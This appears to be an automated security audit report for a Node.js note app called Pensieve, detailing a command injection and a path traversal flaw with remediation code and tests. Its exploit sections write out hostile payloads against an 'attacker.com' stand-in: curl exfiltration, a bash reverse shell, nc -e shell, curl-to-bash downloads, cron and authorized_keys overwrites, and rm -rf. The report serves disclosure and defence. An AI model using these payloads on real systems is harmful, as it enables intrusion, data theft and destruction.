# Pensieve Security Audit Report

**Audit Date:** 2025-11-26
**Audited By:** Automated Security Analysis
**Codebase Version:** Main branch (commit dd92a78)
**Scope:** Backend (_system/src) security vulnerabilities

---

## Executive Summary

**Critical Vulnerabilities Found:** 2
**High Severity Issues:** 2
**Medium Severity Issues:** 1

**Risk Assessment:** **HIGH RISK - DO NOT DEPLOY TO PRODUCTION**

The Pensieve application contains **2 critical security vulnerabilities** that allow:
1. **Remote Code Execution (RCE)** via command injection
2. **Arbitrary File Write** via path traversal

These vulnerabilities are **actively exploitable** and must be remediated before production deployment. An attacker with access to the web interface can execute arbitrary commands on the server or overwrite system files.

**Immediate Actions Required:**
1. Deploy hotfix for VULN-001 (Command Injection) - **Priority 1**
2. Deploy hotfix for VULN-002 (Path Traversal) - **Priority 1**
3. Implement input validation across all endpoints - **Priority 2**
4. Configure CORS properly - **Priority 2**
5. Set up security monitoring and logging - **Priority 3**

---

## Table of Contents

1. [VULN-001: Shell Command Injection in JARVIS TTS](#vuln-001-shell-command-injection-in-jarvis-tts)
2. [VULN-002: Directory Traversal in Note Move Operation](#vuln-002-directory-traversal-in-note-move-operation)
3. [VULN-003: Input Validation Gaps](#vuln-003-input-validation-gaps)
4. [VULN-004: CORS Misconfiguration](#vuln-004-cors-misconfiguration)
5. [VULN-005: Type Coercion Vulnerabilities](#vuln-005-type-coercion-vulnerabilities)
6. [Remediation Roadmap](#remediation-roadmap)
7. [Security Testing Requirements](#security-testing-requirements)
8. [Long-Term Security Recommendations](#long-term-security-recommendations)

---

## VULN-001: Shell Command Injection in JARVIS TTS

### Classification
**CVSS v3.1 Score:** 9.8 (Critical)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
**Severity:** CRITICAL

### Vulnerability Summary
User-controlled input flows into shell commands executed via `execAsync()` with insufficient sanitization. Attacker can inject shell metacharacters to execute arbitrary commands on the server with the privileges of the Node.js process.

### Affected Components

**Primary Locations:**
1. `_system/src/core/services/JarvisService.ts:71-74` - Claude CLI execution
2. `_system/src/core/services/JarvisService.ts:234` - TTS script execution
3. `_system/src/web/routes/jarvis.ts:273-287` - /speak endpoint
4. `_system/src/web/routes/chats.ts:223-225` - Chat JARVIS integration

**Attack Surface:**
- Any note content processed by JARVIS summarization
- Chat messages sent to JARVIS
- Direct calls to /api/jarvis/speak endpoint
- User-controlled text in 4 different code paths

### Technical Analysis

#### Vulnerable Code Pattern

**JarvisService.ts (Line 234):**
```typescript
async playTTS(text: string, language: 'en' | 'zh'): Promise<void> {
  const scriptPath = path.join(__dirname, '../../script/google_tts.sh');
  const langCode = language === 'en' ? 'en-GB' : 'cmn-TW';

  // VULNERABLE: Insufficient escaping
  const escapedText = text.replace(/"/g, '\\"').replace(/`/g, '\\`');

  // VULNERABLE: Template string with user input
  await execAsync(`"${scriptPath}" "${escapedText}" "${langCode}"`, {
    timeout: 30000,
    cwd: process.cwd()
  });
}
```

**What's Wrong:**
1. Escaping only handles `"` and backticks (`)
2. Doesn't escape: `$`, `;`, `|`, `&`, `()`, `<>`, `\n`, `\r`, `\t`
3. Uses template string for shell command (inherently unsafe)
4. No allowlist of valid characters

#### Exploitation

**Attack Payload:**
```json
POST /api/jarvis/speak
Content-Type: application/json

{
  "text": "hello\"; rm -rf /tmp/*; echo \"world",
  "language": "en"
}
```

**What Happens:**
1. Attacker payload: `hello"; rm -rf /tmp/*; echo "world`
2. After escaping: `hello\"; rm -rf /tmp/*; echo \"world`
3. Final command: `"script.sh" "hello\"; rm -rf /tmp/*; echo \"world" "en-GB"`
4. Shell interprets as THREE commands:
   - `script.sh "hello\"` (fails)
   - `rm -rf /tmp/*` (**EXECUTES - deletes temp files**)
   - `echo "world" "en-GB"` (executes)

**More Severe Attack:**
```json
{
  "text": "test\"; curl http://attacker.com/$(whoami); echo \"done",
  "language": "en"
}
```
Result: Exfiltrates server username to attacker's server.

**Worst Case Attack:**
```json
{
  "text": "x\"; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'; echo \"y",
  "language": "en"
}
```
Result: Opens reverse shell, full server compromise.

### Attack Scenarios

#### Scenario 1: Note Summarization
1. User creates note with malicious content in title or body
2. User clicks "Summarize with JARVIS" in web UI
3. Note content flows to JarvisService.summarizeNote()
4. Malicious content injected into Claude CLI command
5. Command executes on server

**Payload in Note:**
```markdown
---
title: "Meeting Notes"
---

Summary: The meeting discussed $(/bin/nc attacker.com 1234 -e /bin/sh)
```

#### Scenario 2: Chat Interface
1. User chats with JARVIS in web UI
2. User message: `Tell me about ; cat /etc/passwd > /tmp/leaked.txt ;`
3. Message flows through ChatService to JarvisService
4. Command injection executes on server
5. Attacker retrieves /tmp/leaked.txt via separate note upload

#### Scenario 3: Direct API Call
1. Attacker calls /api/jarvis/speak directly (no auth required)
2. Payload: `{"text": "$(curl http://attacker.com/malware.sh | bash)"}`
3. Downloads and executes malware script
4. Server fully compromised

### Root Cause Analysis

**Why This Exists:**
1. **Convenience over security:** Using template strings easier than spawn() arrays
2. **Incomplete understanding:** Developer knew to escape `"` but missed other metacharacters
3. **No security review:** Code merged without security-focused code review
4. **Trust in input:** Assumption that user input would be benign text

**Why It's Dangerous:**
1. **Remote execution:** Attacker doesn't need local access
2. **No authentication:** Some endpoints accessible without login
3. **High privileges:** Node.js process may run as privileged user
4. **Data access:** Can read vault files, environment variables, secrets
5. **Lateral movement:** Can compromise other services on same server

### Impact Assessment

**Confidentiality:** HIGH
- Read any file accessible to Node.js process
- Exfiltrate vault contents, notes, personal data
- Read environment variables (may contain API keys)

**Integrity:** HIGH
- Modify/delete any file writable by Node.js process
- Corrupt database/vault data
- Inject malicious content into notes

**Availability:** HIGH
- Delete critical files (DoS)
- Crash application
- Consume system resources (fork bomb)

**Overall Impact:** Complete server compromise

### Proof of Concept

**Test Payload (Safe):**
```bash
curl -X POST http://localhost:3000/api/jarvis/speak \
  -H "Content-Type: application/json" \
  -d '{
    "text": "test\"; whoami > /tmp/pwned.txt; echo \"done",
    "language": "en"
  }'

# Check if file created
cat /tmp/pwned.txt
# Should show username if vulnerable
```

**Expected Result if Vulnerable:**
- File `/tmp/pwned.txt` created with server username
- Confirms command injection successful

### Remediation Steps

#### Step 1: Replace execAsync with spawn (REQUIRED)

**Before (Vulnerable):**
```typescript
const escapedText = text.replace(/"/g, '\\"').replace(/`/g, '\\`');
await execAsync(`"${scriptPath}" "${escapedText}" "${langCode}"`, ...);
```

**After (Secure):**
```typescript
import { spawn } from 'child_process';
import { promisify } from 'util';

async playTTS(text: string, language: 'en' | 'zh'): Promise<void> {
  const scriptPath = path.join(__dirname, '../../script/google_tts.sh');
  const langCode = language === 'en' ? 'en-GB' : 'cmn-TW';

  // NO ESCAPING NEEDED - arguments passed as array
  return new Promise((resolve, reject) => {
    const proc = spawn(scriptPath, [text, langCode], {
      timeout: 30000,
      cwd: process.cwd()
    });

    proc.on('close', (code) => {
      if (code === 0) resolve();
      else reject(new Error(`TTS failed with code ${code}`));
    });

    proc.on('error', reject);
  });
}
```

**Why This Works:**
- `spawn()` passes arguments as array, not shell string
- No shell interpretation of special characters
- Impossible to inject additional commands
- Standard practice for secure command execution

#### Step 2: Validate Input (Defense in Depth)

Even with spawn(), add input validation:

```typescript
function validateTTSText(text: string): void {
  // Max length (prevent DoS)
  if (text.length > 10000) {
    throw new Error('Text too long (max 10000 characters)');
  }

  // Reject control characters
  if (/[\x00-\x1F\x7F]/.test(text)) {
    throw new Error('Text contains invalid control characters');
  }

  // Optional: Allowlist of safe characters
  if (!/^[\p{L}\p{N}\p{P}\p{Z}]+$/u.test(text)) {
    throw new Error('Text contains invalid characters');
  }
}
```

#### Step 3: Update All Affected Functions

**Files to Update:**
1. `JarvisService.ts:71-74` - summarizeNote Claude CLI call
2. `JarvisService.ts:234` - playTTS function
3. `jarvis.ts:273-287` - /speak route handler
4. `chats.ts:223-225` - chat JARVIS integration

**Same Pattern for All:**
- Replace execAsync template strings
- Use spawn() with argument arrays
- Add input validation
- Add proper error handling

#### Step 4: Create Temp Files for Complex Input

For Claude CLI prompts (JarvisService.ts:71-74), use temp files:

```typescript
async summarizeNote(noteId: string, language: 'en' | 'zh'): Promise<string> {
  const note = await NoteService.getById(noteId);
  const prompt = this.buildPrompt(note.content, language);

  // Write prompt to temp file (secure)
  const tempFile = path.join(os.tmpdir(), `prompt-${Date.now()}.txt`);
  await fs.writeFile(tempFile, prompt);

  try {
    // Pass file path, not content
    const proc = spawn('claude', [
      '--print',
      '--model', 'haiku',
      '--allowedTools', 'Bash(_system/script/google_tts.sh:*)'
    ], {
      stdio: ['pipe', 'pipe', 'pipe']
    });

    // Pipe file content to stdin
    const fileStream = fs.createReadStream(tempFile);
    fileStream.pipe(proc.stdin);

    // Collect output...
  } finally {
    await fs.unlink(tempFile);
  }
}
```

### Verification Testing

**After Fix, Test with:**

1. **Benign Input:**
   ```json
   {"text": "Hello world", "language": "en"}
   ```
   Expected: Works normally

2. **Semicolon:**
   ```json
   {"text": "test; echo 'injected'", "language": "en"}
   ```
   Expected: Treats entire string as text, no command execution

3. **Backticks:**
   ```json
   {"text": "test `whoami` test", "language": "en"}
   ```
   Expected: Literal backticks in output

4. **Dollar Sign:**
   ```json
   {"text": "Price is $(curl attacker.com)", "language": "en"}
   ```
   Expected: Literal dollar sign, no variable expansion

5. **Newlines:**
   ```json
   {"text": "line1\nrm -rf /\nline2", "language": "en"}
   ```
   Expected: Newline treated as literal character

**Verification Success Criteria:**
- All payloads treated as literal text
- No file creation in /tmp
- No network requests to external domains
- Error logs show no shell command errors

### Timeline

**Discovery:** 2025-11-26 (During code audit)
**Disclosure:** Internal (not publicly disclosed)
**Recommended Fix Date:** Immediate (within 24-48 hours)
**Estimated Fix Time:** 4-6 hours

---

## VULN-002: Directory Traversal in Note Move Operation

### Classification
**CVSS v3.1 Score:** 8.1 (High)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**Severity:** CRITICAL

### Vulnerability Summary
The note move operation accepts a user-controlled `subPath` parameter that is not sanitized, allowing directory traversal attacks. Attacker can write notes to arbitrary locations on the filesystem, potentially overwriting critical system files.

### Affected Components

**Primary Location:**
- `_system/src/core/services/NoteService.ts:201-227` - moveTo() method
- `_system/src/web/routes/notes.ts:241` - POST /api/notes/:id/move endpoint

**Attack Surface:**
- Any authenticated user can move notes
- `subPath` parameter passed directly to file system operations
- No validation of final destination path

### Technical Analysis

#### Vulnerable Code

**NoteService.ts (Lines 201-227):**
```typescript
static async moveTo(
  note: Note,
  paraFolder: NoteFrontmatter['para_folder'],
  subPath: string = ''  // ← USER-CONTROLLED, NOT SANITIZED!
): Promise<void> {
  const vaultPath = config.getVaultPath();
  const folderMap = {
    inbox: '0-inbox',
    projects: '1-projects',
    areas: '2-areas',
    resources: '3-resources',
    archive: '4-archive',
  };

  // VULNERABLE: subPath concatenated without validation
  const paraPath = path.join(folderMap[paraFolder], subPath);

  note.moveTo(paraFolder, paraPath);

  const newFilePath = this.getNotePath(note);

  // VULNERABLE: Writes to calculated path with no bounds checking
  await moveFile(note.filePath, newFilePath);

  note.filePath = newFilePath;
  this.invalidateCache();
}
```

**notes.ts (Line 241):**
```typescript
router.post('/:id/move', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { folder, subPath } = req.body;  // ← subPath from user

    const note = await NoteService.getById(id);
    if (!note) return res.status(404).json({ error: 'Note not found' });

    // VULNERABLE: No validation before passing to moveTo
    await NoteService.moveTo(note, folder as any, subPath);

    res.json({ success: true, note });
  } catch (error) {
    res.status(500).json({ error: 'Failed to move note' });
  }
});
```

#### Exploitation

**Attack Request:**
```bash
POST /api/notes/20251125143052/move
Content-Type: application/json

{
  "folder": "projects",
  "subPath": "../../../etc/cron.d/malicious-job"
}
```

**What Happens:**
1. `folderMap[projects]` → `"1-projects"`
2. `path.join("1-projects", "../../../etc/cron.d/malicious-job")`
3. Result: `"../../etc/cron.d/malicious-job"`
4. `getNotePath()` prepends vault path: `/home/user/vault/../../etc/cron.d/malicious-job`
5. `path.resolve()` normalizes to: `/etc/cron.d/malicious-job`
6. `moveFile()` writes note content to `/etc/cron.d/malicious-job`
7. Cron executes malicious commands in note content

**Result:** Note content (controlled by attacker) written to system cron directory.

### Attack Scenarios

#### Scenario 1: Overwrite Cron Jobs
**Goal:** Persistent code execution

```bash
# Step 1: Create note with malicious cron job
POST /api/notes
{
  "title": "Malicious",
  "content": "* * * * * root curl http://attacker.com/payload.sh | bash"
}

# Step 2: Move note to /etc/cron.d/
POST /api/notes/[noteId]/move
{
  "folder": "projects",
  "subPath": "../../../etc/cron.d/backdoor"
}

# Result: Cron executes payload every minute as root
```

#### Scenario 2: Overwrite System Configuration
**Goal:** Modify system behavior

```bash
# Move note to SSH authorized_keys
POST /api/notes/[noteId]/move
{
  "folder": "areas",
  "subPath": "../../../root/.ssh/authorized_keys"
}

# Note content: Attacker's SSH public key
# Result: SSH access as root
```

#### Scenario 3: Web Server Document Root
**Goal:** Host malicious content

```bash
# Move note to web server directory
POST /api/notes/[noteId]/move
{
  "folder": "resources",
  "subPath": "../../../var/www/html/shell.php"
}

# Note content: PHP webshell
# Result: Remote code execution via web browser
```

### Impact Assessment

**Confidentiality:** HIGH
- Read-only access not directly affected
- But can overwrite files to exfiltrate data

**Integrity:** HIGH
- Write notes to ANY location writable by Node.js process
- Overwrite configuration files
- Corrupt system files
- Modify application code

**Availability:** MEDIUM
- Can delete files by overwriting (data loss)
- Crash application by corrupting config
- Not direct DoS but can cause instability

**Overall Impact:** System compromise, persistence, privilege escalation potential

### Proof of Concept

**Safe Test (Creates file in /tmp):**
```bash
# Step 1: Create test note
curl -X POST http://localhost:3000/api/notes \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Test Traversal",
    "content": "This file should not exist in /tmp"
  }'

# Step 2: Attempt path traversal to /tmp
curl -X POST http://localhost:3000/api/notes/[noteId]/move \
  -H "Content-Type: application/json" \
  -d '{
    "folder": "inbox",
    "subPath": "../../../tmp/traversal-test.md"
  }'

# Step 3: Verify
ls -la /tmp/traversal-test.md
# If file exists, vulnerability confirmed
```

### Root Cause Analysis

**Why This Exists:**
1. **Feature design:** subPath intended for project subfolders like "project-name/subdir"
2. **Missing validation:** No checks that final path stays within vault
3. **Trust in input:** Assumed API clients would only send valid paths
4. **No security review:** Path traversal not considered during development

**Defense Mechanisms Bypassed:**
- None - no defenses implemented
- path.join() normalizes `..` but doesn't validate result
- No checks that final path is within vault directory

### Remediation Steps

#### Step 1: Validate subPath (REQUIRED)

```typescript
function sanitizeSubPath(subPath: string): string {
  if (!subPath) return '';

  // Reject absolute paths
  if (path.isAbsolute(subPath)) {
    throw new Error('Absolute paths not allowed');
  }

  // Reject parent directory references
  if (subPath.includes('..')) {
    throw new Error('Parent directory references (..) not allowed');
  }

  // Reject paths starting with /
  if (subPath.startsWith('/') || subPath.startsWith('\\')) {
    throw new Error('Path must be relative');
  }

  // Allowlist: only alphanumeric, dash, underscore, slash
  if (!/^[a-zA-Z0-9_\-/]+$/.test(subPath)) {
    throw new Error('Invalid characters in path');
  }

  return subPath;
}
```

#### Step 2: Validate Final Destination

```typescript
static async moveTo(
  note: Note,
  paraFolder: NoteFrontmatter['para_folder'],
  subPath: string = ''
): Promise<void> {
  const vaultPath = config.getVaultPath();

  // Sanitize user input
  const safeSubPath = sanitizeSubPath(subPath);

  const folderMap = { /* ... */ };
  const paraPath = path.join(folderMap[paraFolder], safeSubPath);

  note.moveTo(paraFolder, paraPath);
  const newFilePath = this.getNotePath(note);

  // Resolve to absolute path
  const resolvedNewPath = path.resolve(newFilePath);
  const resolvedVaultPath = path.resolve(vaultPath);

  // CRITICAL: Verify final path is within vault
  if (!resolvedNewPath.startsWith(resolvedVaultPath)) {
    throw new Error('Destination outside vault directory');
  }

  // Check for symlinks (prevent symlink bypass)
  const newPathReal = await fs.realpath(path.dirname(newFilePath));
  if (!newPathReal.startsWith(resolvedVaultPath)) {
    throw new Error('Symlink traversal detected');
  }

  await moveFile(note.filePath, newFilePath);
  note.filePath = newFilePath;
  this.invalidateCache();
}
```

#### Step 3: Update API Route Validation

```typescript
router.post('/:id/move', async (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const { folder, subPath } = req.body;

    // Validate folder is valid enum value
    const validFolders = ['inbox', 'projects', 'areas', 'resources', 'archive'];
    if (!validFolders.includes(folder)) {
      return res.status(400).json({ error: 'Invalid folder' });
    }

    // Validate subPath length
    if (subPath && subPath.length > 200) {
      return res.status(400).json({ error: 'Path too long' });
    }

    const note = await NoteService.getById(id);
    if (!note) return res.status(404).json({ error: 'Note not found' });

    // moveTo now validates internally
    await NoteService.moveTo(note, folder, subPath);

    res.json({ success: true, note });
  } catch (error) {
    // Log security events
    if (error.message.includes('not allowed') || error.message.includes('outside vault')) {
      console.warn(`[SECURITY] Path traversal attempt: ${error.message}`);
    }
    res.status(400).json({ error: error.message });
  }
});
```

### Verification Testing

**After Fix, Test with:**

1. **Valid Paths:**
   ```json
   {"folder": "projects", "subPath": "my-project/notes"}
   ```
   Expected: Works normally

2. **Parent Directory:**
   ```json
   {"folder": "inbox", "subPath": "../../etc/passwd"}
   ```
   Expected: Error "Parent directory references (..) not allowed"

3. **Absolute Path:**
   ```json
   {"folder": "areas", "subPath": "/etc/cron.d/malicious"}
   ```
   Expected: Error "Absolute paths not allowed"

4. **Special Characters:**
   ```json
   {"folder": "resources", "subPath": "path;with;semicolons"}
   ```
   Expected: Error "Invalid characters in path"

5. **Symlink Bypass:**
   ```bash
   # Create symlink: vault/test -> /etc
   ln -s /etc vault/test

   # Try to move via symlink
   {"folder": "inbox", "subPath": "test/cron.d/malicious"}
   ```
   Expected: Error "Symlink traversal detected"

### Timeline

**Discovery:** 2025-11-26 (During code audit)
**Disclosure:** Internal (not publicly disclosed)
**Recommended Fix Date:** Immediate (within 24-48 hours)
**Estimated Fix Time:** 2-4 hours

---

## VULN-003: Input Validation Gaps

### Classification
**CVSS v3.1 Score:** 6.5 (Medium)
**CWE:** CWE-20 (Improper Input Validation)
**Severity:** MEDIUM

### Summary
Multiple API endpoints lack input validation, allowing:
- Extremely long inputs (DoS)
- Special characters in filenames (filesystem errors)
- Negative numbers in numeric fields
- Invalid data types (string vs number)

### Affected Endpoints
- POST /api/notes - No title/content length limits
- POST /api/projects - No name validation (allows spaces, special chars)
- PUT /api/journals/:date - No energyLevel range validation
- All endpoints - No request body size limits

### Remediation
1. Implement request body size limits (e.g., 1MB max)
2. Add Zod or Joi schema validation to all endpoints
3. Validate string lengths: title (max 100), content (max 1MB), tags (max 50)
4. Validate numeric ranges: energyLevel (1-10), progress (0-100)
5. Sanitize filenames: only allow alphanumeric, dash, underscore

**Estimated Fix Time:** 6-8 hours

---

## VULN-004: CORS Misconfiguration

### Classification
**CVSS v3.1 Score:** 5.3 (Medium)
**CWE:** CWE-942 (Overly Permissive Cross-Origin Resource Sharing)
**Severity:** MEDIUM

### Summary
CORS configured to allow ALL origins, enabling CSRF attacks.

### Vulnerable Code
**_system/src/web/server.ts:17**
```typescript
app.use(cors());  // Allows ALL origins!
```

### Impact
- Any website can make API requests on behalf of logged-in users
- Enables CSRF attacks if session cookies used
- Can read user's notes via malicious website

### Remediation
```typescript
const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [
  'http://localhost:5173',  // Development
  'https://pensieve.example.com'  // Production
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true  // If using cookies
}));
```

**Estimated Fix Time:** 1 hour

---

## VULN-005: Type Coercion Vulnerabilities

### Classification
**CVSS v3.1 Score:** 4.3 (Medium)
**CWE:** CWE-843 (Access of Resource Using Incompatible Type)
**Severity:** LOW-MEDIUM

### Summary
API endpoints don't validate request body types, allowing type coercion attacks.

### Examples

**Example 1: String instead of Number**
```json
POST /api/projects/test-project/progress
{"progress": "50; DROP TABLE notes;--"}
```
Result: Depends on how backend handles - could cause errors or unexpected behavior.

**Example 2: Array instead of String**
```json
POST /api/notes
{"title": ["array", "instead", "of", "string"]}
```
Result: Title becomes "[object Object]" or causes crash.

### Remediation
Use Zod for runtime type validation:
```typescript
import { z } from 'zod';

const updateProgressSchema = z.object({
  progress: z.number().min(0).max(100)
});

router.post('/:name/progress', async (req, res) => {
  const validation = updateProgressSchema.safeParse(req.body);
  if (!validation.success) {
    return res.status(400).json({
      error: 'Validation failed',
      details: validation.error.errors
    });
  }

  const { progress } = validation.data;  // Type-safe!
  // ...
});
```

**Estimated Fix Time:** 8-10 hours (all endpoints)

---

## Remediation Roadmap

### Phase 1: Critical Fixes (Week 1)

**Day 1-2: Command Injection**
- [ ] Update JarvisService.playTTS() to use spawn()
- [ ] Update JarvisService.summarizeNote() to use spawn()
- [ ] Update jarvis.ts /speak endpoint
- [ ] Update chats.ts JARVIS integration
- [ ] Add input validation for TTS text
- [ ] Test with malicious payloads

**Day 3-4: Path Traversal**
- [ ] Implement sanitizeSubPath() function
- [ ] Update NoteService.moveTo() with validation
- [ ] Add final path verification
- [ ] Add symlink detection
- [ ] Update API route error handling
- [ ] Test with traversal payloads

**Day 5: Testing & Deployment**
- [ ] Security regression testing
- [ ] Penetration testing (internal)
- [ ] Code review
- [ ] Deploy hotfix to production

### Phase 2: High Priority (Week 2)

**Input Validation**
- [ ] Install Zod dependency
- [ ] Create validation schemas for all endpoints
- [ ] Add request body size limits
- [ ] Implement field length validations
- [ ] Test edge cases

**CORS Configuration**
- [ ] Update CORS middleware with origin allowlist
- [ ] Add environment variable configuration
- [ ] Test cross-origin requests
- [ ] Document allowed origins

### Phase 3: Security Hardening (Week 3-4)

**Monitoring & Logging**
- [ ] Add security event logging
- [ ] Log failed validation attempts
- [ ] Set up alerting for suspicious activity
- [ ] Implement rate limiting

**Security Headers**
- [ ] Add Helmet.js for security headers
- [ ] Configure CSP (Content Security Policy)
- [ ] Enable HSTS
- [ ] Set X-Frame-Options

**Authentication & Authorization**
- [ ] Review authentication mechanism
- [ ] Implement API rate limiting
- [ ] Add request throttling
- [ ] Session security review

---

## Security Testing Requirements

### Pre-Deployment Testing

**Required Tests Before Production:**

1. **Command Injection Tests**
   - [ ] Test all TTS endpoints with shell metacharacters
   - [ ] Test Claude CLI inputs with payloads
   - [ ] Verify spawn() prevents injection
   - [ ] Check file creation in /tmp (should be none)

2. **Path Traversal Tests**
   - [ ] Test note move with `../` sequences
   - [ ] Test absolute paths
   - [ ] Test symlink bypass attempts
   - [ ] Verify all paths stay within vault

3. **Input Validation Tests**
   - [ ] Send oversized payloads (>1MB)
   - [ ] Send invalid types (string where number expected)
   - [ ] Send special characters in all fields
   - [ ] Test boundary values (min/max)

4. **CORS Tests**
   - [ ] Test cross-origin requests from unauthorized domains
   - [ ] Verify allowed origins work
   - [ ] Check credential handling

### Automated Security Testing

**Add to CI/CD Pipeline:**
```yaml
security-tests:
  - npm audit (dependency vulnerabilities)
  - eslint-plugin-security (code patterns)
  - OWASP ZAP (dynamic analysis)
  - Snyk (container scanning)
```

### Penetration Testing Checklist

- [ ] Attempt command injection on all user input paths
- [ ] Attempt path traversal on file operations
- [ ] Test for SQL injection (not applicable - file-based)
- [ ] Test for XSS in markdown rendering
- [ ] Attempt authentication bypass
- [ ] Test rate limiting (DoS)
- [ ] Review session handling
- [ ] Check for sensitive data exposure

---

## Long-Term Security Recommendations

### Architectural Improvements

1. **Principle of Least Privilege**
   - Run Node.js process as non-privileged user
   - Restrict filesystem permissions
   - Use AppArmor/SELinux policies

2. **Defense in Depth**
   - Input validation at API boundary
   - Validation again in services
   - Filesystem sandboxing
   - Output encoding

3. **Secure Defaults**
   - Deny-by-default file permissions
   - Allowlist-based validation (not blocklist)
   - Fail securely (errors don't expose info)

### Process Improvements

1. **Security Code Review**
   - All shell command execution reviewed
   - All file operations reviewed
   - User input handling reviewed
   - Security champion on team

2. **Security Testing**
   - Automated security tests in CI/CD
   - Quarterly penetration testing
   - Bug bounty program (optional)
   - Security regression tests

3. **Security Monitoring**
   - Log all security events
   - Alert on suspicious patterns
   - Regular log review
   - Incident response plan

### Developer Training

**Recommended Topics:**
- OWASP Top 10
- Secure coding practices
- Command injection prevention
- Path traversal prevention
- Input validation techniques
- Authentication & authorization

---

## Conclusion

The Pensieve application has **2 critical vulnerabilities** requiring immediate remediation:

1. **Command Injection (CVSS 9.8)** - Allows remote code execution
2. **Path Traversal (CVSS 8.1)** - Allows arbitrary file write

**DO NOT DEPLOY TO PRODUCTION** until these are fixed and verified.

**Estimated Total Remediation Time:** 40-50 hours
- Critical fixes: 20-24 hours
- High priority fixes: 10-12 hours
- Testing & verification: 10-14 hours

**Next Steps:**
1. Prioritize VULN-001 and VULN-002 fixes
2. Complete security testing per checklist
3. Deploy hotfix to production
4. Address remaining vulnerabilities in sprint
5. Implement long-term security improvements

---

**Report Prepared By:** Automated Security Analysis
**Review Required:** Manual security review recommended
**Follow-Up:** Re-audit after fixes implemented
